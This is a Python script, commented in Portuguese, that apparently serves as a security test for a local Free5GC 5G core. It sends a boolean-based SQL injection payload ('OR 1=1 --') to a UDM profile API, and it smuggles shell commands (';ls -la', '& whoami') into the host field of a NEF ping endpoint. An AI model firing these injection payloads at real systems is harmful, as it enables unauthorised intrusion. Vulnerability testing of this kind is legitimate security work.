import requests
import urllib3
import json
import time

#--- Configurações de Ambientes (Valores Padrão dp Free5GC)
NF_CONFIG = {
    "UDM_IP": "127.0.0.1",
    "UDM_PORT": 29503,
    "NEF_IP": "127.0.0.1",
    "NEF_PORT": 29509,
    "SUPI_1": "208930000000001"
}

#Desabilitar avisos de certificados autoassinados
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#--- Teste de SQL Injection (Boolean-based blind)
def test_sql_injection():
    print("=" * 50)
    print("A1 - Testando SQL Injection em APIs (SBA)")
    print("=" * 50)

    nf_api_url_sqli = f"https://{NF_CONFIG['UDM_IP']}:{NF_CONFIG['UDM_PORT']}/api/profile"
    target_param = "id"
    headers = {"Content-Type": "application/json"}

    try:
        response_control = requests.post(nf_api_url_sqli, headers=headers, data=json.dumps({target_param: f"'{NF_CONFIG['SUPI_1']}'"}), verify=False, timeout=5)
        len_control = len(response_control.text)

        response_true = requests.post(nf_api_url_sqli, headers=headers, data=json.dumps({target_param: f"'{NF_CONFIG['SUPI_1']}' OR 1=1 --"}), verify=False, timeout=5)
        len_true = len(response_true.text)

        if len_true > len_control:
            print("[!!!] SQL Injection (Boolean-based) detectada! A API é vulnerável.")
        else:
            print("[+] SQL Injection (Boolean-based) não detectada")

    except requests.exceptions.RequestException as e:
        print(f"[-] Erro ao testar SQLi: {e}")

#--- Teste de Command Injection
def test_command_injection():
    print("\n" + "=" * 50)
    print("A1 - Testando Command Injection em APIs (SBA)")
    print("=" * 50)

    nf_mgmt_url = f"https://{NF_CONFIG['NEF_IP']}:{NF_CONFIG['NEF_PORT']}/management/ping"
    target_cmd_param = "host"
    headers = {"Content-Type": "application/json"}
    commands = ["; ls -la", "& whoami"]

    for cmd in commands:
        try:
            response = requests.post(nf_mgmt_url, headers=headers, data=json.dumps({target_cmd_param: f"127.0.0.1{cmd}"}), verify=False, timeout=5)
            if "total" in response.text or "uid=" in response.text:
                print(f"[!!!] Command Injection detectada! Comando '{cmd}' funcionou.")
                return

        except requests.exceptions.RequestException:
            pass

    print("[-] Command Injection não detectado.")

if __name__ == "__main__":
    test_sql_injection()
    test_command_injection()